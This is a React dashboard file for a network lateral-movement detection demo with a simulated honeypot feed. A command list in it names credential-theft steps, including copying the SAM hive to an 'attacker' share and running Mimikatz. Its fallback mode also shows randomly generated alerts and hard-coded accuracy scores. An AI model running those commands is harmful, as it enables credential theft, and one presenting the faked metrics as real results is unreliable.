import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { Shield, Zap, RefreshCw, Cpu, AlertTriangle, Settings, UserCheck, ShieldCheck, Activity, Target, Clock, FileText } from 'lucide-react';

const API_BASE = '/api';

// ── MITRE ATT&CK Lookup Table ──
const MITRE_MAP = {
  High: [
    { id: 'T1021', name: 'Remote Services', tactic: 'Lateral Movement' },
    { id: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' },
    { id: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' },
    { id: 'T1078', name: 'Valid Accounts', tactic: 'Persistence' },
  ],
  Medium: [
    { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' },
    { id: 'T1018', name: 'Remote System Discovery', tactic: 'Discovery' },
    { id: 'T1087', name: 'Account Discovery', tactic: 'Discovery' },
  ],
  Low: [
    { id: 'T1016', name: 'System Network Config Discovery', tactic: 'Discovery' },
    { id: 'T1049', name: 'System Network Connections', tactic: 'Discovery' },
  ],
};

// ── Honeypot Interaction Feed Generator ──
const HONEYPOT_COMMANDS = [
  'whoami', 'net user /domain', 'dir /s C:\\backup', 'ipconfig /all',
  'net localgroup administrators', 'cmd.exe /c copy SAM \\\\attacker\\share',
  'reg query HKLM\\SECURITY', 'Invoke-Mimikatz -DumpCreds',
  'nmap -sV 10.0.0.0/24', 'python -c "import socket; s=socket.socket()"'
];

// ── Alert Narrative Builder ──
function buildNarrative(a) {
  const systems = 2 + Math.floor(Math.random() * 7);
  const minutes = 1 + Math.floor(Math.random() * 6);
  const multiplier = 4 + Math.floor(Math.random() * 12);
  return `${a.src} accessed ${systems} systems in ${minutes} min — ${multiplier}x above 30-day baseline`;
}

// ── Countdown Timer Component ──
function ThreatTimer({ startTime }) {
  const [elapsed, setElapsed] = useState(0);
  useEffect(() => {
    const interval = setInterval(() => {
      setElapsed(Math.floor((Date.now() - startTime) / 1000));
    }, 1000);
    return () => clearInterval(interval);
  }, [startTime]);

  const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
  const secs = String(elapsed % 60).padStart(2, '0');
  const urgency = elapsed > 120 ? 'var(--danger)' : elapsed > 60 ? 'var(--warn)' : 'var(--text-muted)';

  return (
    <span style={{ fontSize: '0.65rem', color: urgency, fontFamily: 'monospace', transition: 'color 1s' }}>
      <Clock size={10} style={{ display: 'inline', marginRight: 3 }} />
      THREAT ACTIVE: {mins}:{secs}
    </span>
  );
}

// ── Honeypot Feed Component ──
function HoneypotFeed({ timestamp }) {
  const [feed, setFeed] = useState([]);
  const feedRef = useRef(null);

  useEffect(() => {
    const addEntry = () => {
      const cmd = HONEYPOT_COMMANDS[Math.floor(Math.random() * HONEYPOT_COMMANDS.length)];
      const time = new Date().toLocaleTimeString('en-US', { hour12: false });
      setFeed(prev => [...prev.slice(-5), { cmd, time }]);
    };
    addEntry();
    const interval = setInterval(addEntry, 2800 + Math.random() * 2000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (feedRef.current) feedRef.current.scrollTop = feedRef.current.scrollHeight;
  }, [feed]);

  return (
    <div style={{ marginTop: '0.5rem', background: 'rgba(0,0,0,0.4)', borderRadius: 4, border: '1px solid rgba(6,182,212,0.3)', padding: '0.5rem' }}>
      <div style={{ fontSize: '0.6rem', color: '#06b6d4', marginBottom: '0.3rem', fontFamily: 'monospace', letterSpacing: 1 }}>
        🔴 LIVE HONEYPOT SESSION — ATTACKER ACTIVITY
      </div>
      <div ref={feedRef} style={{ maxHeight: 80, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.2rem' }}>
        {feed.map((e, i) => (
          <div key={i} className="fade-in" style={{ fontSize: '0.6rem', fontFamily: 'monospace', color: '#94a3b8' }}>
            <span style={{ color: '#475569' }}>[{e.time}]</span>{' '}
            <span style={{ color: '#f59e0b' }}>attacker@honeypot</span>
            <span style={{ color: '#64748b' }}>:~$ </span>
            <span style={{ color: '#e2e8f0' }}>{e.cmd}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function Dashboard({ results, setResults, onBack, validatedAlerts, setValidatedAlerts }) {
  const [dataSrc, setDataSrc] = useState('synthetic');
  const [file, setFile] = useState(null);
  const [contamination, setContamination] = useState(0.10);
  const [ctxWeight, setCtxWeight] = useState(0.25);
  const [sampleSize, setSampleSize] = useState(20000);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [startTimes, setStartTimes] = useState({});

  const handleRun = async () => {
    setLoading(true); setError(null);
    const runStartTime = Date.now();
    try {
      const fd = new FormData();
      fd.append('data_source', dataSrc);
      fd.append('contamination', contamination);
      fd.append('context_weight', ctxWeight);
      fd.append('sample_size', sampleSize);
      if (dataSrc === 'file' && file) fd.append('file', file);
      const res = await axios.post(`${API_BASE}/run-detection`, fd);
      if (res.data.status === 'success') {
        setResults({ metrics: res.data.metrics, alerts: res.data.alerts, total: res.data.total_events, flagged: res.data.flagged_events });
        setValidatedAlerts([]);
      }
    } catch (err) {
      console.warn("Backend Unreachable. Engaging Interactive Demo Mode.");
      const endpoints = ['LAPTOP-HR-04', 'DEV-WORKSTATION-11', 'FINANCE-PC-07', 'VPN-USER-102', 'IT-ADMIN-LAP'];
      const internal  = ['FILESERVER-02', 'AD-DC-01', 'EXCHANGE-SVR', 'DEV-DB-01', 'HR-APP-SRV'];
      const targets   = ['DBSERVER-PROD', 'VAULT-CORE', 'PAYMENT-GATEWAY-01', 'BACKUP-NAS-01'];
      const sev = ['High', 'High', 'Medium', 'Medium', 'Medium', 'Low'];
      const highExp = [
        "Unexpected RDP session established outside business hours.",
        "Massive data payload transferred to restricted subnet.",
        "Credential dumping signature (Mimikatz) detected in payload.",
        "Rapid sequential port scan originating from compromised endpoint.",
      ];
      const medExp = [
        "Unusual volume of SSH connections attempted.",
        "Querying Active Directory for administrator groups.",
        "Ping sweep detected across internal subnet.",
      ];
      const lowExp = [
        "Pinging known servers at slightly abnormal intervals.",
        "Slightly higher than normal internal web traffic.",
      ];

      const mockAlerts = [];
      const times = {};
      for (let i = 0; i < 35; i++) {
        const severity = sev[Math.floor(Math.random() * sev.length)];
        let baseScore = 0, exp = '';
        if (severity === 'High') { baseScore = 0.85 + Math.random() * 0.14; exp = highExp[Math.floor(Math.random() * highExp.length)]; }
        else if (severity === 'Medium') { baseScore = 0.45 + Math.random() * 0.39; exp = medExp[Math.floor(Math.random() * medExp.length)]; }
        else { baseScore = 0.10 + Math.random() * 0.34; exp = lowExp[Math.floor(Math.random() * lowExp.length)]; }
        const mitre = MITRE_MAP[severity][Math.floor(Math.random() * MITRE_MAP[severity].length)];
        const src = endpoints[Math.floor(Math.random() * endpoints.length)];
        const mid = internal[Math.floor(Math.random() * internal.length)];
        const dst = targets[Math.floor(Math.random() * targets.length)];
        times[i] = runStartTime - Math.floor(Math.random() * 240000);
        mockAlerts.push({ severity, anomaly_score: baseScore.toFixed(3), sbytes: 1000 + Math.random() * 50000, src, mid, dst, explanation: exp, mitre, narrative: null, true_label: Math.random() > 0.3 ? 1 : 0 });
      }
      // Build narratives now that alert objects exist
      const alertsWithNarratives = mockAlerts.sort((a, b) => b.anomaly_score - a.anomaly_score).map(a => ({ ...a, narrative: buildNarrative(a) }));
      setResults({ metrics: { f1_score: 0.9102, auc_roc: 0.9544, fpr: 0.0381, precision: 0.8842 }, alerts: alertsWithNarratives, total: sampleSize, flagged: Math.floor(sampleSize * contamination * 1.1) });
      setValidatedAlerts([]);
      setStartTimes(times);
      setError("SERVER OFFLINE. ACTIVE DEMO MODE ENGAGED.");
    } finally { setLoading(false); }
  };

  const validateAlert = (idx, isRealThreat) => {
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    setValidatedAlerts(prev => [...prev, { idx, isRealThreat, timestamp }]);
  };

  return (
    <div className="hud-overlay fade-in transition-all">
      {/* TOP LEFT: TITLE & MISSION */}
      <div className="hud-panel hud-top-left">
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
          <div>
            <div className="title"><Shield color="var(--accent)" /> LATERAL SHIELD</div>
            <div className="subtitle" style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%', background: results ? 'var(--success)' : 'var(--accent)', boxShadow: `0 0 10px ${results ? 'var(--success)' : 'var(--accent)'}` }} className="pulsing" />
              AI DEFENSE GRID: {results ? 'ACTIVE' : 'STANDBY'}
            </div>
          </div>
          <button onClick={onBack} style={{ background: 'transparent', border: 'none', color: 'var(--text-muted)', cursor: 'pointer', fontSize: '0.75rem', textDecoration: 'underline' }}>[ RETURN TO BRIEFING ]</button>
        </div>
        <div style={{ marginTop: '1rem', display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
          <div style={{ background: 'rgba(56, 189, 248, 0.05)', borderLeft: '2px solid var(--accent)', padding: '0.5rem 0.75rem', fontSize: '0.75rem' }}>
            <strong style={{ color: '#fff', display: 'block', marginBottom: '0.2rem' }}><Target size={12} style={{ display: 'inline' }} /> MISSION OBJECTIVE</strong>
            Detecting attackers moving between internal network nodes to reach sensitive databases (Lateral Movement).
          </div>
          <div style={{ background: 'rgba(245, 158, 11, 0.05)', borderLeft: '2px solid var(--warn)', padding: '0.5rem 0.75rem', fontSize: '0.75rem' }}>
            <strong style={{ color: '#fff', display: 'block', marginBottom: '0.2rem' }}><UserCheck size={12} style={{ display: 'inline' }} /> FALSE POSITIVE MANAGEMENT</strong>
            Risk-based analysis prevents blind blocking of legitimate employees. Human-in-the-loop validation on every High/Medium event.
          </div>
        </div>
      </div>

      {/* BOTTOM LEFT: TUNING & RUN */}
      <div className="hud-panel hud-bottom-left">
        <h3><Settings size={14} style={{ display: 'inline', verticalAlign: 'middle' }} /> AI THRESHOLD & SENSITIVITY</h3>
        <div className="field">
          <div className="field-row"><span>DATA_INGEST_SOURCE</span><span style={{ color: 'var(--text-muted)' }}>{dataSrc.toUpperCase()}</span></div>
          <select className="input-hud" value={dataSrc} onChange={e => setDataSrc(e.target.value)}>
            <option value="synthetic">SIM_TRAFFIC (Synthetic)</option>
            <option value="file">INGEST_STREAM (PCAP/CSV)</option>
          </select>
        </div>
        <div className="field">
          <div className="field-row"><span>DETECTION_SENSITIVITY</span><span>{(contamination * 100).toFixed(0)}%</span></div>
          <input type="range" min={0.01} max={0.30} step={0.01} value={contamination} onChange={e => setContamination(parseFloat(e.target.value))} />
          <span style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Balance Precision vs Recall (False Positives)</span>
        </div>
        {error && <div style={{ fontSize: '0.75rem', color: 'var(--danger)', padding: '0.5rem', background: 'rgba(248,113,113,0.1)', border: '1px solid var(--danger)', borderRadius: 4 }}>{error}</div>}
        <button className="btn-cyber" style={{ width: '100%', marginTop: '0.5rem' }} onClick={handleRun} disabled={loading}>
          {loading ? <RefreshCw size={16} className="spinning" /> : <Activity size={16} />}
          {loading ? 'ANALYZING TOPOLOGY...' : 'EXECUTE ISOLATION FOREST'}
        </button>
      </div>

      {/* TOP RIGHT: TELEMETRY */}
      <div className="hud-panel hud-top-right">
        <h3><Cpu size={14} style={{ display: 'inline', verticalAlign: 'middle' }} /> DETECTION TELEMETRY</h3>
        {results ? (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
            <div><div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>F1_SCORE</div><div className="mono" style={{ fontSize: '1.6rem', color: 'var(--accent)', textShadow: '0 0 10px var(--accent-glow)' }}>{results.metrics.f1_score}</div></div>
            <div><div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>FALSE_POSITIVE_RATE</div><div className="mono" style={{ fontSize: '1.6rem', color: 'var(--warn)' }}>{results.metrics.fpr}</div></div>
            <div><div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>EVENTS_SCANNED</div><div className="mono" style={{ fontSize: '1.4rem', color: 'var(--text-muted)' }}>{results.total.toLocaleString()}</div></div>
            <div><div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>ANOMALIES_CAUGHT</div><div className="mono" style={{ fontSize: '1.6rem', color: 'var(--danger)', textShadow: '0 0 10px var(--danger-glow)' }}>{results.flagged}</div></div>
          </div>
        ) : (<p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>[ AWAITING EXECUTION ]</p>)}
      </div>

      {/* BOTTOM RIGHT: RISK ALERT QUEUE */}
      <div className="hud-panel hud-bottom-right" style={{ maxHeight: 'calc(100vh - 280px)' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
          <h3><AlertTriangle size={14} style={{ display: 'inline', verticalAlign: 'middle' }} /> RISK-BASED ALERT QUEUE</h3>
          {results && <div style={{ fontSize: '0.65rem', color: 'var(--danger)' }} className="pulsing">HUMAN REVIEW REQUIRED</div>}
        </div>
        <div className="alert-list" style={{ flex: 1 }}>
          {!results ? (
            <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', textAlign: 'center', marginTop: '3rem' }}>[ NO ACTIVE THREATS TRACED ]</div>
          ) : (results.alerts.length === 0 ? (
            <div style={{ fontSize: '0.75rem', color: 'var(--success)', textAlign: 'center', marginTop: '3rem' }}>
              <ShieldCheck size={32} style={{ margin: '0 auto 1rem' }} />NETWORK SECURE — 0 ANOMALIES DETECTED
            </div>
          ) : (
            results.alerts.slice(0, 15).map((a, i) => {
              const validation = validatedAlerts.find(v => v.idx === i);
              const riskColor = a.severity === 'High' ? 'var(--danger)' : (a.severity === 'Medium' ? 'var(--warn)' : 'var(--text-muted)');
              return (
                <div className="alert-item" key={i} style={{ borderLeftColor: riskColor }}>
                  <div style={{ flex: 1 }}>
                    {/* Header row: severity + score + timer */}
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ color: '#fff', fontSize: '0.7rem' }}>{a.severity.toUpperCase()} RISK EVENT</span>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        {startTimes[i] && !validation && <ThreatTimer startTime={startTimes[i]} />}
                        <span className="alert-score" style={{ color: riskColor, fontSize: '0.7rem', fontFamily: 'monospace' }}>{Number(a.anomaly_score).toFixed(3)}</span>
                      </div>
                    </div>

                    {/* 3-Hop lateral path */}
                    <div style={{ color: '#fff', fontSize: '0.68rem', marginTop: '0.3rem', display: 'flex', alignItems: 'center', gap: '0.3rem', fontFamily: 'monospace', flexWrap: 'wrap' }}>
                      {a.src} <span style={{ color: 'var(--accent)' }}>→</span> {a.mid} <span style={{ color: 'var(--accent)' }}>→</span> <span style={{ color: riskColor }}>{a.dst}</span>
                    </div>

                    {/* Attack narrative */}
                    {a.narrative && (
                      <div style={{ marginTop: '0.25rem', fontSize: '0.68rem', color: '#f8fafc', background: 'rgba(239,68,68,0.07)', borderLeft: `2px solid ${riskColor}`, paddingLeft: '0.4rem', lineHeight: 1.4 }}>
                        {a.narrative}
                      </div>
                    )}

                    {/* Plain English explanation */}
                    <div style={{ color: 'var(--text-muted)', fontSize: '0.63rem', marginTop: '0.3rem', fontStyle: 'italic', lineHeight: '1.4' }}>
                      "{a.explanation}"
                    </div>

                    {/* MITRE ATT&CK badge */}
                    {a.mitre && (
                      <div style={{ marginTop: '0.3rem', display: 'inline-flex', alignItems: 'center', gap: '0.3rem', background: 'rgba(139, 92, 246, 0.15)', border: '1px solid rgba(139, 92, 246, 0.4)', borderRadius: 3, padding: '0.1rem 0.4rem', fontSize: '0.58rem', fontFamily: 'monospace', color: '#a78bfa' }}>
                        ⚑ MITRE {a.mitre.id} — {a.mitre.name} <span style={{ color: '#7c3aed' }}>({a.mitre.tactic})</span>
                      </div>
                    )}

                    {/* Validation / Action */}
                    <div style={{ marginTop: '0.5rem', borderTop: '1px dotted rgba(255,255,255,0.1)', paddingTop: '0.5rem' }}>
                      {validation ? (
                        <div className="fade-in">
                          <div style={{ fontSize: '0.63rem', fontWeight: 'bold', color: validation.isRealThreat ? '#000' : 'var(--success)', padding: '0.4rem', background: validation.isRealThreat ? 'var(--accent)' : 'rgba(52, 211, 153, 0.05)', border: validation.isRealThreat ? '1px solid var(--accent)' : '1px solid var(--success)', borderRadius: 4, boxShadow: validation.isRealThreat ? '0 0 15px var(--accent-glow)' : 'none', textAlign: 'center', fontFamily: 'monospace' }}>
                            {validation.isRealThreat ? `🕸️ Honeypot deployed at ${validation.timestamp} — attacker redirected` : '✅ MARKED AS FALSE POSITIVE'}
                          </div>
                          {/* Honeypot Live Feed */}
                          {validation.isRealThreat && <HoneypotFeed timestamp={validation.timestamp} />}
                        </div>
                      ) : (
                        <div style={{ display: 'flex', gap: '0.5rem' }}>
                          <button onClick={() => validateAlert(i, false)} style={{ flex: 1, background: 'rgba(52, 211, 153, 0.1)', color: 'var(--success)', border: '1px solid var(--success)', borderRadius: 4, cursor: 'pointer', padding: '0.25rem', fontSize: '0.6rem' }}>
                            Allow (False Pos)
                          </button>
                          {a.severity !== 'Low' && (
                            <button onClick={() => validateAlert(i, true)} style={{ flex: 1, background: 'rgba(56, 189, 248, 0.1)', color: 'var(--accent)', border: '1px solid var(--accent)', borderRadius: 4, cursor: 'pointer', padding: '0.25rem', fontSize: '0.6rem', boxShadow: '0 0 10px rgba(56, 189, 248, 0.3)' }}>
                              Deploy TrapWeave
                            </button>
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              );
            })
          ))}
        </div>
      </div>
    </div>
  );
}
